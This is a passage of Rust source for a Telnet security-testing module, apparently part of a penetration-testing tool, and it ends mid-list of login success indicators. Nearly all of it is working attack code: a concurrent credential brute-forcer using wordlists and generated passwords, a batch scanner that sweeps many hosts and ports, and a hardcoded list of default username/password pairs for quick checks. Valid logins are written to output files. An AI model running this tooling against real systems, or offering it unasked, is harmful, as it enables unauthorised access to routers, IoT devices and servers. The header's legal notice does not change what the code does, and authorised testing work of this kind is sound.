// src/modules/telnet.rs
// Comprehensive Telnet Security Testing Module
//
// ⚠️ LEGAL NOTICE ⚠️
// This tool is designed for AUTHORIZED security testing ONLY.
// Unauthorized access to computer systems is illegal under:
// - Computer Fraud and Abuse Act (CFAA) - USA
// - Computer Misuse Act - UK
// - Similar laws in other jurisdictions
//
// Only use this tool on systems you own or have explicit written permission to test.

use anyhow::{anyhow, Context, Result};
use colored::*;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::net::{SocketAddr, ToSocketAddrs};
use std::path::Path;
use std::sync::{
    atomic::{AtomicBool, AtomicU64, Ordering},
    Arc,
};
use std::time::{Duration, Instant};
use tokio::fs::{File, OpenOptions};
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, Mutex, Semaphore};
use tokio::time::{sleep, timeout};

// ============================================================
// CONSTANTS
// ============================================================

const MAX_MEMORY_SIZE: u64 = 500 * 1024 * 1024;
const CHANNEL_BUFFER_MULTIPLIER: usize = 16;
const PROGRESS_INTERVAL_SECS: u64 = 3;
const BUFFER_SIZE: usize = 4096;
const RESPONSE_BUFFER_CAPACITY: usize = 2048;
const DEFAULT_TELNET_PORTS: &[u16] = &[23, 2323, 23231];

const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("admin", "admin"),
    ("user", "user"),
    ("guest", "guest"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", ""),
    ("admin", ""),
    ("telnet", "telnet"),
    ("support", "support"),
    ("tech", "tech"),
    ("test", "test"),
    ("oracle", "oracle"),
];

// ============================================================
// MAIN ENTRY POINT
// ============================================================

pub async fn run(target: &str) -> Result<()> {
    display_banner();

    println!("Select operation mode:");
    println!("  1. Single Target Bruteforce (advanced)");
    println!("  2. Batch Scanner (multiple targets)");
    println!("  3. Quick Default Credential Check");
    println!();

    let mode = prompt_required("Select mode [1-3]: ");

    match mode.as_str() {
        "1" => run_single_target_bruteforce(target).await,
        "2" => run_batch_scanner(target).await,
        "3" => run_quick_check(target).await,
        _ => {
            println!("[!] Invalid selection");
            Ok(())
        }
    }
}

// ============================================================
// MODE 1: SINGLE TARGET ADVANCED BRUTEFORCE
// ============================================================

async fn run_single_target_bruteforce(target: &str) -> Result<()> {
    println!("\n{}", "=== Single Target Bruteforce Mode ===".bold().cyan());
    println!();

    let target = target.trim().to_string();

    let use_config = prompt_yes_no("Do you have a configuration file? (y/n): ", false);

    let mut config = if use_config {
        println!();
        print_config_format();
        println!();

        let config_path = prompt_wordlist("Path to configuration file: ")?;

        println!("[*] Loading configuration from '{}'...", config_path);
        match load_and_validate_config(&config_path, &target).await {
            Ok(cfg) => {
                println!("{}", "[+] Configuration loaded and validated!".green().bold());
                cfg
            }
            Err(e) => {
                eprintln!("{}", "[!] Configuration validation failed:".red().bold());
                eprintln!("    {}", e.to_string().yellow());
                return Err(e);
            }
        }
    } else {
        build_interactive_config(&target).await?
    };

    config.preprocess_prompts();
    print_config_summary(&config);

    if !prompt_yes_no("\nProceed with this configuration? (y/n): ", true) {
        println!("[*] Aborted by user.");
        return Ok(());
    }

    if !use_config && prompt_yes_no("\nSave this configuration? (y/n): ", false) {
        let save_path = prompt_required("Configuration file path: ");
        if let Err(e) = save_config(&config, &save_path).await {
            eprintln!("[!] Failed to save config: {}", e);
        } else {
            println!("[+] Configuration saved to '{}'", save_path);
        }
    }

    println!();
    println!("{}", "[Starting Attack]".bold().yellow());
    println!();

    run_telnet_bruteforce(config).await
}

// ============================================================
// MODE 2: BATCH SCANNER
// ============================================================

async fn run_batch_scanner(target: &str) -> Result<()> {
    println!("\n{}", "=== Batch Scanner Mode ===".bold().cyan());
    println!();

    let mut config = BatchScanConfig::default();

    // Load targets
    if Path::new(target).exists() {
        let content = tokio::fs::read_to_string(target).await?;
        config.targets = parse_targets(&content)?;
    } else {
        config.targets = parse_targets(target)?;
    }

    if config.targets.is_empty() {
        return Err(anyhow!("No valid targets specified"));
    }

    println!("Loaded {} target(s)", config.targets.len());

    // Configure ports
    if prompt_yes_no("Use default ports (23, 2323, 23231)? (y/n): ", true) {
        config.ports = DEFAULT_TELNET_PORTS.to_vec();
    } else {
        let ports_str = prompt_required("Enter ports (comma-separated): ");
        config.ports = ports_str
        .split(',')
        .filter_map(|s| s.trim().parse().ok())
        .collect();
    }

    // Configure credentials
    if prompt_yes_no("Use default credential list? (y/n): ", true) {
        config.credentials = DEFAULT_CREDENTIALS
        .iter()
        .map(|(u, p)| (u.to_string(), p.to_string()))
        .collect();
    } else {
        let cred_file = prompt_wordlist("Path to credentials file (user:pass format): ")?;
        config.credentials = load_credentials_file(&cred_file).await?;
    }

    config.max_concurrent = prompt_threads(50);
    config.verbose = prompt_yes_no("Verbose output? (y/n): ", false);
    config.output_file = prompt_required("Output file: ");

    println!();
    println!("Configuration:");
    println!("  Targets:      {}", config.targets.len());
    println!("  Ports:        {:?}", config.ports);
    println!("  Credentials:  {}", config.credentials.len());
    println!("  Concurrency:  {}", config.max_concurrent);
    println!();

    if !prompt_yes_no("Start scan? (y/n): ", true) {
        println!("Scan cancelled");
        return Ok(());
    }

    println!();
    execute_batch_scan(config).await
}

// ============================================================
// MODE 3: QUICK DEFAULT CREDENTIAL CHECK
// ============================================================

async fn run_quick_check(target: &str) -> Result<()> {
    println!("\n{}", "=== Quick Default Credential Check ===".bold().cyan());
    println!();

    let targets = if Path::new(target).exists() {
        let content = tokio::fs::read_to_string(target).await?;
        parse_targets(&content)?
    } else {
        vec![target.to_string()]
    };

    let port: u16 = prompt_required("Port (default 23): ")
    .parse()
    .unwrap_or(23);

    println!();
    println!("Testing {} target(s) on port {} with {} default credentials...",
             targets.len(), port, DEFAULT_CREDENTIALS.len());
    println!();

    let mut found_any = false;

    for target_ip in targets {
        println!("[*] Testing {}:{}", target_ip, port);

        for (username, password) in DEFAULT_CREDENTIALS {
            match try_telnet_login_simple(&target_ip, port, username, password, 3).await {
                Ok(true) => {
                    println!(
                        "  {} Valid: {}/{}",
                        "✓".bright_green().bold(),
                             username,
                             if password.is_empty() { "(blank)" } else { password }
                    );
                    found_any = true;
                }
                Ok(false) => {
                    // Silent fail for quick check - only show errors in verbose mode
                }
                Err(e) => {
                    println!("  {} Error: {}", "!".yellow(), e);
                    break;
                }
            }
            sleep(Duration::from_millis(200)).await;
        }
        println!();
    }

    if !found_any {
        println!("{}", "[-] No valid credentials found".yellow());
    }

    Ok(())
}

// ============================================================
// CONFIGURATION STRUCTURES
// ============================================================

#[derive(Clone, Serialize, Deserialize)]
struct TelnetBruteforceConfig {
    #[serde(skip)]
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: Option<String>,
    threads: usize,
    delay_ms: u64,
    connection_timeout: u64,
    read_timeout: u64,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    raw_bruteforce: bool,
    raw_charset: String,
    raw_min_length: usize,
    raw_max_length: usize,
    output_file: String,
    append_mode: bool,
    pre_validate: bool,
    retry_on_error: bool,
    max_retries: usize,
    login_prompts: Vec<String>,
    password_prompts: Vec<String>,
    success_indicators: Vec<String>,
    failure_indicators: Vec<String>,

    #[serde(skip)]
    login_prompts_lower: Vec<String>,
    #[serde(skip)]
    password_prompts_lower: Vec<String>,
    #[serde(skip)]
    success_indicators_lower: Vec<String>,
    #[serde(skip)]
    failure_indicators_lower: Vec<String>,
}

#[derive(Clone)]
struct BatchScanConfig {
    targets: Vec<String>,
    ports: Vec<u16>,
    credentials: Vec<(String, String)>,
    timeout: Duration,
    max_concurrent: usize,
    output_file: String,
    verbose: bool,
}

impl Default for BatchScanConfig {
    fn default() -> Self {
        Self {
            targets: Vec::new(),
            ports: DEFAULT_TELNET_PORTS.to_vec(),
            credentials: DEFAULT_CREDENTIALS
            .iter()
            .map(|(u, p)| (u.to_string(), p.to_string()))
            .collect(),
            timeout: Duration::from_secs(3),
            max_concurrent: 50,
            output_file: "telnet_scan_results.txt".to_string(),
            verbose: false,
        }
    }
}

#[derive(Debug, Clone)]
struct ScanResult {
    ip: String,
    port: u16,
    banner: String,
    credentials: Option<(String, String)>,
    timestamp: String,
}

impl TelnetBruteforceConfig {
    #[inline]
    fn preprocess_prompts(&mut self) {
        self.login_prompts_lower = self.login_prompts.iter().map(|s| s.to_lowercase()).collect();
        self.password_prompts_lower = self.password_prompts.iter().map(|s| s.to_lowercase()).collect();
        self.success_indicators_lower = self.success_indicators.iter().map(|s| s.to_lowercase()).collect();
        self.failure_indicators_lower = self.failure_indicators.iter().map(|s| s.to_lowercase()).collect();
    }
}

// ============================================================
// STATISTICS TRACKING
// ============================================================

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    retried_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    #[inline]
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            retried_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    #[inline]
    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    #[inline]
    fn record_retry(&self) {
        self.retried_attempts.fetch_add(1, Ordering::Relaxed);
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {} retry | {:.1}/s    ",
            "[Progress]".cyan(),
               total.to_string().bold(),
               success.to_string().green(),
               failed,
               errors.to_string().red(),
               retries,
               rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        println!("\n{}", "[Final Statistics]".bold().cyan());
        println!("  Total attempts:  {}", total.to_string().bold());
        println!("  Successful:      {}", success.to_string().green().bold());
        println!("  Failed:          {}", failed);
        println!("  Errors:          {}", errors.to_string().yellow());
        println!("  Retries:         {}", retries);
        println!("  Time elapsed:    {:.2}s", elapsed);
        println!("  Average rate:    {:.2} attempts/sec", rate);
        if success > 0 {
            let success_rate = (success as f64 / total as f64) * 100.0;
            println!("  Success rate:    {:.2}%", success_rate);
        }
    }
}

// ============================================================
// CORE TELNET LOGIN FUNCTIONS
// ============================================================

#[inline]
async fn try_telnet_login(
    addr: &str,
    username: &str,
    password: &str,
    config: &TelnetBruteforceConfig,
) -> Result<bool> {
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    let stream = timeout(
        Duration::from_secs(config.connection_timeout),
                         TcpStream::connect(socket)
    )
    .await
    .context("Connection timeout")?
    .context("Connect failed")?;

    let (reader, mut writer) = tokio::io::split(stream);
    let mut reader = BufReader::with_capacity(BUFFER_SIZE, reader);
    let mut buf = vec![0u8; BUFFER_SIZE];

    let mut login_sent = false;
    let mut pass_sent = false;
    let mut response_after_pass = String::with_capacity(RESPONSE_BUFFER_CAPACITY);

    let read_timeout_duration = Duration::from_millis(config.read_timeout * 1000);

    for cycle in 0..15 {
        let read_result = timeout(read_timeout_duration, reader.read(&mut buf)).await;

        let n = match read_result {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => n,
            Ok(Err(_)) | Err(_) => {
                if pass_sent && cycle >= 3 {
                    break;
                }
                continue;
            }
        };

        let output = String::from_utf8_lossy(&buf[..n]);
        let lower = output.to_lowercase();

        if pass_sent {
            response_after_pass.push_str(&output);
        }

        if !login_sent {
            for prompt in &config.login_prompts_lower {
                if lower.contains(prompt.as_str()) {
                    let login_data = format!("{}\r\n", username);
                    timeout(Duration::from_millis(500), writer.write_all(login_data.as_bytes())).await.ok();
                    login_sent = true;
                    break;
                }
            }
            if login_sent {
                continue;
            }
        }

        if login_sent && !pass_sent {
            for prompt in &config.password_prompts_lower {
                if lower.contains(prompt.as_str()) {
                    let pass_data = format!("{}\r\n", password);
                    timeout(Duration::from_millis(500), writer.write_all(pass_data.as_bytes())).await.ok();
                    pass_sent = true;
                    break;
                }
            }
            if pass_sent {
                continue;
            }
        }

        if pass_sent {
            for indicator in &config.failure_indicators_lower {
                if lower.contains(indicator.as_str()) {
                    return Ok(false);
                }
            }

            for indicator in &config.success_indicators_lower {
                if lower.contains(indicator.as_str()) {
                    return Ok(true);
                }
            }
        }
    }

    if pass_sent {
        let final_lower = response_after_pass.to_lowercase();

        for indicator in &config.failure_indicators_lower {
            if final_lower.contains(indicator.as_str()) {
                return Ok(false);
            }
        }

        for indicator in &config.success_indicators_lower {
            if final_lower.contains(indicator.as_str()) {
                return Ok(true);
            }
        }

        if final_lower.len() > 50 {
            return Ok(true);
        }
    }

    Ok(false)
}

async fn try_telnet_login_simple(
    ip: &str,
    port: u16,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let addr = format!("{}:{}", ip, port);
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    let mut stream = timeout(
        Duration::from_secs(timeout_secs),
                             TcpStream::connect(socket)
    )
    .await??;

    let mut buffer = vec![0u8; 1024];

    // Read initial prompt
    timeout(Duration::from_secs(2), stream.read(&mut buffer)).await.ok();

    // Send username
    stream.write_all(format!("{}\n", username).as_bytes()).await?;
    stream.flush().await?;
    sleep(Duration::from_millis(300)).await;

    // Wait for password prompt
    timeout(Duration::from_secs(2), stream.read(&mut buffer)).await.ok();

    // Send password
    stream.write_all(format!("{}\n", password).as_bytes()).await?;
    stream.flush().await?;
    sleep(Duration::from_millis(500)).await;

    // Read response
    let n = match timeout(Duration::from_secs(2), stream.read(&mut buffer)).await {
        Ok(Ok(n)) => n,
        _ => return Ok(false),
    };

    let response = String::from_utf8_lossy(&buffer[..n]).to_lowercase();

    let success = ["#", "$", ">", "welcome", "last login"]
    .iter()
    .any(|indicator| response.contains(indicator));

    let failure = ["incorrect", "failed", "denied", "invalid"]
    .iter()
    .any(|indicator| response.contains(indicator));

    Ok(success && !failure)
}

// ============================================================
// BRUTEFORCE EXECUTION
// ============================================================

async fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
    let addr = normalize_target(&config.target, config.port)?;
    let socket_addr = addr.to_socket_addrs()?.next().context("Unable to resolve target")?;

    println!("[*] Target resolved to: {}", socket_addr);

    if config.pre_validate {
        println!("[*] Validating target is Telnet service...");
        match validate_telnet_target(&addr, &config).await {
            Ok(_) => println!("{}", "[+] Target validation successful".green()),
            Err(e) => {
                eprintln!("{}", format!("[!] Warning: {}", e).yellow());
                if !prompt_yes_no("Continue anyway? (y/n): ", false) {
                    return Err(anyhow!("Target validation failed"));
                }
            }
        }
    }

    let username_size = tokio::fs::metadata(&config.username_wordlist).await?.len();
    let password_size = if let Some(ref path) = config.password_wordlist {
        tokio::fs::metadata(path).await?.len()
    } else {
        0
    };

    let total_size = username_size + password_size;
    let use_streaming = should_use_streaming(total_size);

    let (usernames, passwords, username_count, password_count) = if use_streaming {
        load_wordlists_streaming(&config).await?
    } else {
        load_wordlists_memory(&config).await?
    };

    println!("[*] Loaded {} username(s)", username_count);
    if password_count > 0 {
        println!("[*] Loaded {} password(s)", password_count);
    }

    let estimated_total = calculate_estimated_attempts(&config, username_count, password_count);
    println!("[*] Estimated total attempts: {}", estimated_total);
    println!();

    let output_file = Arc::new(config.output_file.clone());
    initialize_output_file(&output_file, &config).await?;

    let found_creds = Arc::new(Mutex::new(HashSet::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    let channel_buffer = config.threads * CHANNEL_BUFFER_MULTIPLIER;
    let (tx, rx) = mpsc::channel::<(Arc<str>, Arc<str>)>(channel_buffer);

    spawn_producers(
        &config,
        tx,
        use_streaming,
        &usernames,
        &passwords,
        username_count,
        password_count,
        stop_flag.clone(),
    );

    let semaphore = Arc::new(Semaphore::new(config.threads));
    let rx = Arc::new(Mutex::new(rx));
    let mut worker_handles = Vec::with_capacity(config.threads);

    for worker_id in 0..config.threads {
        let h = spawn_worker(
            worker_id,
            rx.clone(),
                             addr.clone(),
                             stop_flag.clone(),
                             found_creds.clone(),
                             output_file.clone(),
                             config.clone(),
                             stats.clone(),
                             semaphore.clone(),
        );
        worker_handles.push(h);
    }

    let progress_handle = spawn_progress_reporter(stats.clone(), stop_flag.clone());

    for h in worker_handles {
        let _ = h.await;
    }

    stop_flag.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    stats.print_final();
    print_final_report(&found_creds, &output_file).await;

    Ok(())
}

// ============================================================
// BATCH SCANNER EXECUTION
// ============================================================

async fn execute_batch_scan(config: BatchScanConfig) -> Result<()> {
    let semaphore = Arc::new(tokio::sync::Semaphore::new(config.max_concurrent));
    let mut tasks = Vec::new();

    println!("Starting scan with {} concurrent tasks...", config.max_concurrent);
    println!();

    for target in config.targets.clone() {
        let sem = semaphore.clone();
        let cfg = config.clone();

        let task = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            scan_target(target, &cfg).await
        });

        tasks.push(task);
    }

    let mut all_results = Vec::new();
    let mut open_ports = 0;
    let mut valid_creds = 0;

    for task in tasks {
        match task.await {
            Ok(results) => {
                open_ports += results.len();
                valid_creds += results.iter().filter(|r| r.credentials.is_some()).count();
                all_results.extend(results);
            }
            Err(e) => {
                println!("{} Task error: {}", "[!]".red(), e);
            }
        }
    }

    println!();
    save_batch_results(&all_results, &config.output_file)?;

    println!();
    println!("{}", "=== Scan Summary ===".bright_blue().bold());
    println!("Targets scanned:       {}", config.targets.len());
    println!("Open telnet ports:     {}", open_ports);
    println!("Valid credentials:     {} {}", valid_creds,
             if valid_creds > 0 { "✓".green() } else { "✗".red() });
    println!("Results saved to:      {}", config.output_file);

    if valid_creds > 0 {
        println!();
        println!("{}", "Valid credentials found:".bright_green().bold());
        for result in &all_results {
            if let Some((u, p)) = &result.credentials {
                println!("  • {}:{} - {}/{}", result.ip, result.port, u,
                         if p.is_empty() { "(blank)" } else { p });
            }
        }
    }

    Ok(())
}

async fn scan_target(ip: String, config: &BatchScanConfig) -> Vec<ScanResult> {
    let mut results = Vec::new();

    for &port in &config.ports {
        if config.verbose {
            println!("{} Scanning {}:{}...", "[*]".cyan(), ip, port);
        }

        let banner = match check_port(&ip, port, config.timeout).await {
            Ok(Some(b)) => b,
            _ => {
                if config.verbose {
                    println!("  {} Port closed", "[✗]".red());
                }
                continue;
            }
        };

        println!("{} {}:{} - Port open", "[+]".green(), ip, port);

        if config.verbose && !banner.is_empty() {
            println!("  [*] Banner: {}", banner.trim());
        }

        let mut found_creds = None;

        for (username, password) in &config.credentials {
            if config.verbose {
                println!("  [*] Trying {}/{}", username,
                         if password.is_empty() { "(blank)" } else { password });
            }

            match try_telnet_login_simple(&ip, port, username, password,
                                          config.timeout.as_secs()).await {
                                              Ok(true) => {
                                                  println!(
                                                      "{} {}:{} - Valid: {}/{}",
                                                      "[✓]".bright_green().bold(),
                                                           ip, port, username,
                                                           if password.is_empty() { "(blank)" } else { password }
                                                  );
                                                  found_creds = Some((username.clone(), password.clone()));
                                                  break;
                                              }
                                              Ok(false) => {
                                                  if config.verbose {
                                                      println!("  {} Invalid", "[✗]".red());
                                                  }
                                              }
                                              Err(e) => {
                                                  if config.verbose {
                                                      println!("  {} Error: {}", "[!]".yellow(), e);
                                                  }
                                              }
                                          }

                                          sleep(Duration::from_millis(100)).await;
        }

        results.push(ScanResult {
            ip: ip.clone(),
                     port,
                     banner: banner.trim().to_string(),
                     credentials: found_creds,
                     timestamp: chrono::Utc::now().to_rfc3339(),
        });
    }

    results
}

async fn check_port(ip: &str, port: u16, timeout_duration: Duration) -> Result<Option<String>> {
    let addr = format!("{}:{}", ip, port);
    let socket: SocketAddr = addr.parse()?;

    let stream = match timeout(timeout_duration, TcpStream::connect(&socket)).await {
        Ok(Ok(s)) => s,
        _ => return Ok(None),
    };

    let mut stream = stream;
    let mut buffer = vec![0u8; 512];

    let banner = match timeout(Duration::from_secs(2), stream.read(&mut buffer)).await {
        Ok(Ok(n)) if n > 0 => String::from_utf8_lossy(&buffer[..n]).to_string(),
        _ => String::new(),
    };

    Ok(Some(banner))
}

// ============================================================
// WORKER AND PRODUCER FUNCTIONS
// ============================================================

fn spawn_worker(
    worker_id: usize,
    rx: Arc<Mutex<mpsc::Receiver<(Arc<str>, Arc<str>)>>>,
                addr: String,
                stop_flag: Arc<AtomicBool>,
                found_creds: Arc<Mutex<HashSet<(String, String)>>>,
                output_file: Arc<String>,
                config: TelnetBruteforceConfig,
                stats: Arc<Statistics>,
                semaphore: Arc<Semaphore>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        loop {
            let pair = {
                let mut guard = rx.lock().await;
                guard.recv().await
            };

            let Some((user, pass)) = pair else { break };

            if stop_flag.load(Ordering::Relaxed) {
                break;
            }

            let _permit = semaphore.acquire().await.unwrap();

            if config.verbose {
                println!("{} [Worker {}] Trying {}:{}", "[*]".bright_blue(), worker_id, user, &pass);
            }

            let mut attempt_result = try_telnet_login(&addr, &user, &pass, &config).await;

            let mut retry_count = 0;
            while config.retry_on_error && retry_count < config.max_retries && attempt_result.is_err() {
                retry_count += 1;
                stats.record_retry();
                sleep(Duration::from_millis(config.delay_ms * 2)).await;
                attempt_result = try_telnet_login(&addr, &user, &pass, &config).await;
            }

            match attempt_result {
                Ok(true) => {
                    stats.record_attempt(true, false);

                    let mut creds = found_creds.lock().await;
                    if creds.insert((user.to_string(), pass.to_string())) {
                        drop(creds);

                        println!("\n{}", format!("[+] VALID: {}:{}", user, pass).green().bold());

                        if let Err(e) = append_result(&output_file, &user, &pass).await {
                            eprintln!("[!] Failed to write result: {}", e);
                        }

                        if config.stop_on_success {
                            stop_flag.store(true, Ordering::Relaxed);
                            break;
                        }
                    }
                }
                Ok(false) => {
                    stats.record_attempt(false, false);
                    if config.verbose {
                        println!("{} Failed: {}:{}", "[-]".red(), user, pass);
                    }
                }
                Err(e) => {
                    stats.record_attempt(false, true);
                    if config.verbose {
                        eprintln!("{} Error ({}): {}:{}", "[!]".yellow(), e, user, pass);
                    }
                }
            }

            if config.delay_ms > 0 {
                sleep(Duration::from_millis(config.delay_ms)).await;
            }
        }
    })
}

fn spawn_progress_reporter(
    stats: Arc<Statistics>,
    stop_flag: Arc<AtomicBool>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(PROGRESS_INTERVAL_SECS));
        loop {
            interval.tick().await;
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }
            stats.print_progress();
        }
    })
}

fn spawn_producers(
    config: &TelnetBruteforceConfig,
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                   use_streaming: bool,
                   usernames: &[String],
                   passwords: &[String],
                   username_count: usize,
                   password_count: usize,
                   stop_flag: Arc<AtomicBool>,
) {
    if use_streaming {
        spawn_streaming_producers(config, tx.clone(), username_count, password_count, stop_flag.clone());
    } else {
        spawn_memory_producers(config, tx.clone(), usernames, passwords, stop_flag.clone());
    }
    drop(tx);
}

fn spawn_streaming_producers(
    config: &TelnetBruteforceConfig,
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                             username_count: usize,
                             password_count: usize,
                             stop_flag: Arc<AtomicBool>,
) {
    if password_count > 0 {
        let password_path = config.password_wordlist.clone().unwrap();
        let username_path = config.username_wordlist.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = enqueue_wordlist_combos_streaming(
                tx_clone, &username_path, &password_path, full_combo,
                stop_clone, username_count, password_count,
            ).await {
                eprintln!("[!] Wordlist producer error: {}", e);
            }
        });
    }

    if config.raw_bruteforce {
        let charset: Vec<char> = config.raw_charset.chars().collect();
        let min_len = config.raw_min_length;
        let max_len = config.raw_max_length;
        let username_path = config.username_wordlist.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = generate_raw_combos_streaming(
                tx_clone, &username_path, charset, min_len, max_len,
                full_combo, stop_clone, username_count,
            ).await {
                eprintln!("[!] Raw producer error: {}", e);
            }
        });
    }
}

fn spawn_memory_producers(
    config: &TelnetBruteforceConfig,
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                          usernames: &[String],
                          passwords: &[String],
                          stop_flag: Arc<AtomicBool>,
) {
    let usernames_arc: Vec<Arc<str>> = usernames.iter().map(|s| Arc::from(s.as_str())).collect();
    let passwords_arc: Vec<Arc<str>> = passwords.iter().map(|s| Arc::from(s.as_str())).collect();

    if !passwords_arc.is_empty() {
        let passwords_clone = passwords_arc.clone();
        let usernames_clone = usernames_arc.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = enqueue_wordlist_combos_fast(
                tx_clone, &usernames_clone, &passwords_clone, full_combo, stop_clone,
            ).await {
                eprintln!("[!] Wordlist producer error: {}", e);
            }
        });
    }

    if config.raw_bruteforce {
        let charset: Vec<char> = config.raw_charset.chars().collect();
        let min_len = config.raw_min_length;
        let max_len = config.raw_max_length;
        let usernames_clone = usernames_arc.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = generate_raw_combos(
                tx_clone, &usernames_clone, charset, min_len, max_len, full_combo, stop_clone,
            ).await {
                eprintln!("[!] Raw producer error: {}", e);
            }
        });
    }
}

// ============================================================
// CONFIGURATION FUNCTIONS
// ============================================================

async fn build_interactive_config(target: &str) -> Result<TelnetBruteforceConfig> {
    println!();
    println!("{}", "[Interactive Configuration]".bold().green());
    println!();

    let port = prompt_port(23);
    let threads = prompt_threads(8);
    let delay_ms = prompt_delay(100);
    let connection_timeout = prompt_timeout("Connection timeout (seconds, default 3): ", 3);
    let read_timeout = prompt_timeout("Read timeout (seconds, default 1): ", 1);

    let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
    let raw_bruteforce = prompt_yes_no("Enable raw brute-force password generation? (y/n): ", false);

    let password_wordlist = if raw_bruteforce {
        prompt_optional_wordlist("Password wordlist (leave blank to skip): ")?
    } else {
        Some(prompt_wordlist("Password wordlist file: ")?)
    };

    let (raw_charset, raw_min_length, raw_max_length) = if raw_bruteforce {
        let charset = prompt_charset("Character set (default: lowercase): ", "abcdefghijklmnopqrstuvwxyz");
        let min_len = prompt_min_length(1, 1, 8);
        let max_len = prompt_max_length(4, min_len, 8);
        (charset, min_len, max_len)
    } else {
        (String::new(), 0, 0)
    };

    let full_combo = prompt_yes_no("Try every username with every password? (y/n): ", false);
    let stop_on_success = prompt_yes_no("Stop on first valid login? (y/n): ", false);

    let output_file = prompt_required("Output file: ");
    let append_mode = if tokio::fs::metadata(&output_file).await.is_ok() {
        prompt_yes_no(&format!("File exists. Append? (y/n): "), true)
    } else {
        false
    };

    let verbose = prompt_yes_no("Verbose mode? (y/n): ", false);
    let pre_validate = prompt_yes_no("Pre-validate target? (y/n): ", true);
    let retry_on_error = prompt_yes_no("Retry failed connections? (y/n): ", true);
    let max_retries = if retry_on_error { prompt_retries(2) } else { 0 };

    let use_custom_prompts = prompt_yes_no("Use custom prompts? (y/n): ", false);

    let (login_prompts, password_prompts, success_indicators, failure_indicators) =
    if use_custom_prompts {
        (
            prompt_list("Login prompts (comma-separated): "),
         prompt_list("Password prompts (comma-separated): "),
         prompt_list("Success indicators (comma-separated): "),
         prompt_list("Failure indicators (comma-separated): "),
        )
    } else {
        get_default_prompts()
    };

    Ok(TelnetBruteforceConfig {
        target: target.to_string(),
       port, username_wordlist, password_wordlist, threads, delay_ms,
       connection_timeout, read_timeout, stop_on_success, verbose, full_combo,
       raw_bruteforce, raw_charset, raw_min_length, raw_max_length,
       output_file, append_mode, pre_validate, retry_on_error, max_retries,
       login_prompts, password_prompts, success_indicators, failure_indicators,
       login_prompts_lower: Vec::new(),
       password_prompts_lower: Vec::new(),
       success_indicators_lower: Vec::new(),
       failure_indicators_lower: Vec::new(),
    })
}

fn get_default_prompts() -> (Vec<String>, Vec<String>, Vec<String>, Vec<String>) {
    (
        vec!["login:".to_string(), "username:".to_string(), "user:".to_string()],
     vec!["password:".to_string()],
     vec![
         "$", "#", "> ", "~ ", "% ", "~$", "~#", "last login", "welcome",
     "welcome to", "logged in", "login successful", "authentication successful",
     "successfully authenticated", "motd", "message of the day",
     "have a lot of fun", "you have mail", "you have new mail", "user@",
     "root@", "admin@", "ubuntu", "debian", "centos", "red hat", "fedora",
     "freebsd", "openbsd", "router>", "router#", "switch>", "switch#",
